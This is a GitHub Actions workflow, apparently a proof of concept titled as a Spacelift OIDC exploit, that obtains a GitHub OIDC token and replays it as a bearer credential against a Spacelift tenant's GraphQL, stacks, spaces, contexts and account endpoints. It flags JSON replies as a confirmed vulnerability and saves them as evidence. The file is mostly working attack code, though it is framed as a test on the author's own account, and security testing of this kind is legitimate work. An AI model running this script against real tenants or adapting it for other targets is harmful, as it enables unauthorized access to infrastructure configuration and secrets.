name: Spacelift OIDC Exploit - Own Account
on: 
  workflow_dispatch:  # Manual trigger only
  push:
    branches: [ main ]

permissions:
  id-token: write  # REQUIRED for OIDC token
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: ğŸ” Get GitHub OIDC Token
        id: get_token
        run: |
          echo "Requesting OIDC token with audience: spacelift"
          
          # Request OIDC token from GitHub
          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=spacelift" | jq -r .value)
          
          # Mask token in logs
          echo "::add-mask::$TOKEN"
          echo "token=$TOKEN" >> $GITHUB_OUTPUT
          
          echo "âœ… Token obtained successfully"
          
          # Display token payload (without signature)
          echo "ğŸ“„ Token payload:"
          echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | jq . || echo "Could not decode"
      
      - name: ğŸ¯ Test Spacelift GraphQL API
        env:
          OIDC_TOKEN: ${{ steps.get_token.outputs.token }}
        run: |
          echo "Testing GraphQL endpoint on YOUR account..."
          
          curl -X POST https://soufian3hm.app.spacelift.dev/api/graphql \
            -H "Authorization: Bearer $OIDC_TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"query":"{ viewer { login id admin } }"}' \
            -o graphql_response.json
          
          echo -e "\nğŸ“Š GraphQL Response:"
          cat graphql_response.json | jq . || cat graphql_response.json
          
          # Check if we got JSON or HTML
          if grep -q "<!doctype" graphql_response.json; then
            echo "âŒ Got HTML login page - authentication FAILED"
          elif grep -q "viewer" graphql_response.json; then
            echo "ğŸš¨ GOT AUTHENTICATED DATA - VULNERABILITY CONFIRMED!"
          fi
      
      - name: ğŸ“¦ Test Stacks API
        env:
          OIDC_TOKEN: ${{ steps.get_token.outputs.token }}
        run: |
          echo "Testing Stacks endpoint..."
          
          curl https://soufian3hm.app.spacelift.dev/api/v1/stacks \
            -H "Authorization: Bearer $OIDC_TOKEN" \
            -o stacks_response.json
          
          echo -e "\nğŸ“Š Stacks Response:"
          cat stacks_response.json | jq . || cat stacks_response.json
          
          if grep -q "<!doctype" stacks_response.json; then
            echo "âŒ Got HTML - No access"
          else
            echo "ğŸš¨ Potential authenticated response!"
          fi
      
      - name: ğŸ‘¤ Test User/Account Info
        env:
          OIDC_TOKEN: ${{ steps.get_token.outputs.token }}
        run: |
          echo "Testing authenticated account info..."
          
          # Try viewer query
          curl -X POST https://soufian3hm.app.spacelift.dev/api/graphql \
            -H "Authorization: Bearer $OIDC_TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"query":"{ viewer { login username id } }"}' \
            -o viewer_response.json
          
          echo -e "\nğŸ“Š Viewer Response:"
          cat viewer_response.json | jq . || cat viewer_response.json
      
      - name: ğŸƒ Test Spaces/Contexts
        env:
          OIDC_TOKEN: ${{ steps.get_token.outputs.token }}
        run: |
          echo "Testing spaces and contexts..."
          
          curl https://soufian3hm.app.spacelift.dev/api/v1/spaces \
            -H "Authorization: Bearer $OIDC_TOKEN" \
            -o spaces_response.json
          
          echo -e "\nğŸ“Š Spaces Response:"
          cat spaces_response.json | jq . || cat spaces_response.json
          
          curl https://soufian3hm.app.spacelift.dev/api/v1/contexts \
            -H "Authorization: Bearer $OIDC_TOKEN" \
            -o contexts_response.json
          
          echo -e "\nğŸ“Š Contexts Response:"
          cat contexts_response.json | jq . || cat contexts_response.json
      
      - name: ğŸ”“ Test Account Settings
        env:
          OIDC_TOKEN: ${{ steps.get_token.outputs.token }}
        run: |
          echo "Testing account settings access..."
          
          curl https://soufian3hm.app.spacelift.dev/api/v1/account \
            -H "Authorization: Bearer $OIDC_TOKEN" \
            -o account_response.json
          
          echo -e "\nğŸ“Š Account Response:"
          cat account_response.json | jq . || cat account_response.json
      
      - name: ğŸ“‹ CRITICAL SUMMARY
        if: always()
        run: |
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo "ğŸ¯ SPACELIFT OIDC EXPLOIT - YOUR ACCOUNT TEST"
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo ""
          echo "Target: https://soufian3hm.app.spacelift.dev"
          echo "Repository: ${{ github.repository }}"
          echo "Actor: ${{ github.actor }}"
          echo ""
          echo "ğŸ” ANALYSIS:"
          echo ""
          
          # Check all responses
          for file in graphql_response.json stacks_response.json viewer_response.json spaces_response.json contexts_response.json account_response.json; do
            if [ -f "$file" ]; then
              if grep -q "<!doctype" "$file" 2>/dev/null; then
                echo "  âŒ $file: HTML login page (NOT authenticated)"
              elif grep -q "{" "$file" 2>/dev/null && ! grep -q "<!doctype" "$file" 2>/dev/null; then
                echo "  âœ… $file: JSON response (POSSIBLY authenticated!)"
              else
                echo "  âš ï¸  $file: Unknown response type"
              fi
            fi
          done
          
          echo ""
          echo "If you see JSON responses above, the vulnerability IS CONFIRMED!"
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
      
      - name: ğŸ“¤ Upload Evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: spacelift-own-account-evidence
          path: |
            graphql_response.json
            stacks_response.json
            viewer_response.json
            spaces_response.json
            contexts_response.json
            account_response.json
          retention-days: 7
